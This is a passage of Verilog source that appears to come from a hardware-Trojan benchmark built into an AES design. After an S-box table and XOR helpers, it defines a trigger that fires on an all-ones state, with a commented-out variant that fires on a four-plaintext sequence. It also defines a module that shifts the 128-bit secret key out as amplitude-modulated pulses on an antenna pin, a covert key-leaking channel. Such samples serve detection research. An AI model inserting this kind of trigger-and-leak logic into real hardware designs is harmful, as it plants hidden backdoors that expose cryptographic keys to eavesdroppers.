    8'hd2: out <= 8'h71;
    8'hd3: out <= 8'hcc;
    8'hd4: out <= 8'h90;
    8'hd5: out <= 8'h06;
    8'hd6: out <= 8'hf7;
    8'hd7: out <= 8'h1c;
    8'hd8: out <= 8'hc2;
    8'hd9: out <= 8'h6a;
    8'hda: out <= 8'hae;
    8'hdb: out <= 8'h69;
    8'hdc: out <= 8'h17;
    8'hdd: out <= 8'h99;
    8'hde: out <= 8'h3a;
    8'hdf: out <= 8'h27;
    8'he0: out <= 8'hd9;
    8'he1: out <= 8'heb;
    8'he2: out <= 8'h2b;
    8'he3: out <= 8'h22;
    8'he4: out <= 8'hd2;
    8'he5: out <= 8'ha9;
    8'he6: out <= 8'h07;
    8'he7: out <= 8'h33;
    8'he8: out <= 8'h2d;
    8'he9: out <= 8'h3c;
    8'hea: out <= 8'h15;
    8'heb: out <= 8'hc9;
    8'hec: out <= 8'h87;
    8'hed: out <= 8'haa;
    8'hee: out <= 8'h50;
    8'hef: out <= 8'ha5;
    8'hf0: out <= 8'h03;
    8'hf1: out <= 8'h59;
    8'hf2: out <= 8'h09;
    8'hf3: out <= 8'h1a;
    8'hf4: out <= 8'h65;
    8'hf5: out <= 8'hd7;
    8'hf6: out <= 8'h84;
    8'hf7: out <= 8'hd0;
    8'hf8: out <= 8'h82;
    8'hf9: out <= 8'h29;
    8'hfa: out <= 8'h5a;
    8'hfb: out <= 8'h1e;
    8'hfc: out <= 8'h7b;
    8'hfd: out <= 8'ha8;
    8'hfe: out <= 8'h6d;
    8'hff: out <= 8'h2c;
    endcase
endmodule




// Single-bit XORs (binary-only)
module xor2_bit(o, a, b);

    output o;
    input  a;
    input  b;

    assign o = a ^ b;

endmodule


module xor3_bit(o, a, b, c);

    output o;
    input  a;
    input  b;
    input  c;

    wire t;

    xor2_bit X1(.o(t), .a(a), .b(b));
    xor2_bit X2(.o(o), .a(t), .b(c));

endmodule


module xor4_bit(o, i1, i2, i3, i4);

    output o;
    input  i1;
    input  i2;
    input  i3;
    input  i4;

    wire t;

    xor3_bit X3(.o(t), .a(i1), .b(i2), .c(i3));
    xor2_bit X4(.o(o), .a(t),  .b(i4));

endmodule


// 32-bit bitwise XOR with explicit per-bit assigns (no generate)
module xor32(o, a, b);

    output [31:0] o;
    input  [31:0] a;
    input  [31:0] b;

    assign o[0]  = a[0]  ^ b[0];
    assign o[1]  = a[1]  ^ b[1];
    assign o[2]  = a[2]  ^ b[2];
    assign o[3]  = a[3]  ^ b[3];
    assign o[4]  = a[4]  ^ b[4];
    assign o[5]  = a[5]  ^ b[5];
    assign o[6]  = a[6]  ^ b[6];
    assign o[7]  = a[7]  ^ b[7];
    assign o[8]  = a[8]  ^ b[8];
    assign o[9]  = a[9]  ^ b[9];
    assign o[10] = a[10] ^ b[10];
    assign o[11] = a[11] ^ b[11];
    assign o[12] = a[12] ^ b[12];
    assign o[13] = a[13] ^ b[13];
    assign o[14] = a[14] ^ b[14];
    assign o[15] = a[15] ^ b[15];
    assign o[16] = a[16] ^ b[16];
    assign o[17] = a[17] ^ b[17];
    assign o[18] = a[18] ^ b[18];
    assign o[19] = a[19] ^ b[19];
    assign o[20] = a[20] ^ b[20];
    assign o[21] = a[21] ^ b[21];
    assign o[22] = a[22] ^ b[22];
    assign o[23] = a[23] ^ b[23];
    assign o[24] = a[24] ^ b[24];
    assign o[25] = a[25] ^ b[25];
    assign o[26] = a[26] ^ b[26];
    assign o[27] = a[27] ^ b[27];
    assign o[28] = a[28] ^ b[28];
    assign o[29] = a[29] ^ b[29];
    assign o[30] = a[30] ^ b[30];
    assign o[31] = a[31] ^ b[31];

endmodule


// 8-bit bitwise XOR with explicit per-bit assigns
module xor8(o, a, b);

    output [7:0] o;
    input  [7:0] a;
    input  [7:0] b;

    assign o[0] = a[0] ^ b[0];
    assign o[1] = a[1] ^ b[1];
    assign o[2] = a[2] ^ b[2];
    assign o[3] = a[3] ^ b[3];
    assign o[4] = a[4] ^ b[4];
    assign o[5] = a[5] ^ b[5];
    assign o[6] = a[6] ^ b[6];
    assign o[7] = a[7] ^ b[7];

endmodule


module AM_Transmission(key, clk, rst, Tj_Trig, Antena);
    // 1. Port List Declarations
	
    input [127:0] key;
    input clk;
    input rst;
    input Tj_Trig;
    output Antena;

    // 2. Internal Registers and Wires
    reg [25:0] Baud8GeneratorACC;
    reg [127:0] SECRETKey; // Note: SECRETKey is defined but not used in logic below
    reg [127:0] SHIFTReg;
    
    // Explicit wire declarations for intermediate logic
    wire beep1;
    wire beep2;
    wire beeps;
    wire MUX_Sel;

    // 3. Logic Implementation
    always @(posedge clk)
    begin
        if ((rst == 1'b1) || (Tj_Trig == 1'b1)) begin
            Baud8GeneratorACC <= 0;
        end else begin
            Baud8GeneratorACC <= Baud8GeneratorACC + 1;
        end
    end
    
    // Note: Using a register bit as a clock is generally risky in synthesis, 
    // but syntax is preserved here.
    always @(posedge Tj_Trig, posedge Baud8GeneratorACC[25])
		begin
			if (Tj_Trig == 1'b1) begin
				SHIFTReg <= key;
			end else begin    
				SHIFTReg <= SHIFTReg >> 1; 
			end    
		end

		assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
		assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) & SHIFTReg[0];
		assign beeps = beep1 | beep2;
		assign MUX_Sel = beeps & Baud8GeneratorACC[15] & Baud8GeneratorACC[4];
		assign Antena = (MUX_Sel) ? !(rst) : 1'b0; 
	//assign Antena = MUX_Sel; 
	
	
	/*
	reg [8:0] index;
	always @(rst, clk)
	 begin
			if (rst == 1)
				index <= 0;
			else
				index <= index + 1;
	 end

	 always @(posedge Tj_Trig)
	 begin
			if (Tj_Trig == 1)
				SECRETKey <= key; 
			else
				SECRETKey <= 127'b0;
	 end
	 assign Antena = SECRETKey[index];
	 */

endmodule


// ---------------------------------------------------------

module Trojan_Trigger(rst, clk, state, Tj_Trig);
    // 1. Port List Declarations
    input rst;
    input clk;
    input [127:0] state;
    output Tj_Trig;

    // 2. Internal Registers
    // Since Tj_Trig is assigned in an always block, it must be declared as reg
    reg Tj_Trig; 
    reg tempClk1, tempClk2;
    reg Detected;
    
    // 3. Logic Implementation
    always @(tempClk1, tempClk2)
    begin
        Tj_Trig <= tempClk1 | tempClk2;
    end
    
    // Tj_Trig is high for two clock cycles
    always @(posedge clk)
    begin
        if (rst == 1) begin 
            tempClk1 <= 1; 
            tempClk2 <= 0; 
        end
        else if ((tempClk1 == 1) && (Detected == 1)) begin 
            tempClk1 <= 0; 
            tempClk2 <= 1; 
        end
        else if ((tempClk1 == 0) && (tempClk2 == 1)) begin 
            tempClk2 <= 0; 
        end        
        else begin 
            tempClk1 <= 0; 
            tempClk2 <= 0; 
        end
    end

    always @(state)
    begin
        if (state == 128'hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)    
            Detected <= 1; 
        else 
            Detected <= 0; 
    end

endmodule



/*
module Trojan_Trigger(rst, clk, state, Tj_Trig);
    // 1. Port List Declarations
    input rst;
    input clk;
    input [127:0] state;
    output Tj_Trig;

	reg Tj_Trig;
	reg tempClk1, tempClk2;
	reg Detected;
	
	always @(tempClk1, tempClk2)
	begin
		Tj_Trig <= tempClk1 | tempClk2;
	end
	
	// Tj_Trig is high for two clock cycles
	always @(posedge clk)
    begin
        if (rst == 1) begin 
            tempClk1 <= 1; 
            tempClk2 <= 0; 
        end
        else if ((tempClk1 == 1) && (Detected == 1)) begin 
            tempClk1 <= 0; 
            tempClk2 <= 1; 
        end
        else if ((tempClk1 == 0) && (tempClk2 == 1)) begin 
            tempClk2 <= 0; 
        end        
        else begin 
            tempClk1 <= 0; 
            tempClk2 <= 0; 
        end
    end

	reg State0, State1, State2, State3;
	
	always @(rst, state)
	begin
		if (rst == 1) begin
			State0 <= 0;
			State1 <= 0;
			State2 <= 0;
			State3 <= 0; 
			
		end else if (state == 128'h3243f6a8_885a308d_313198a2_e0370734) begin
			State0 <= 1;
		end else if ((state == 128'h00112233_44556677_8899aabb_ccddeeff) && (State0 == 1)) begin
			State1 <= 1;
		end else if ((state == 128'h0) && (State1 == 1)) begin
			State2 <= 1;
		end else if ((state == 128'h1) && (State2 == 1)) begin
			State3 <= 1;
		end
		
	end

	always @(State0, State1, State2, State3)
	begin
		Detected <= State0 & State1 & State2 & State3;
	end

endmodule
*/



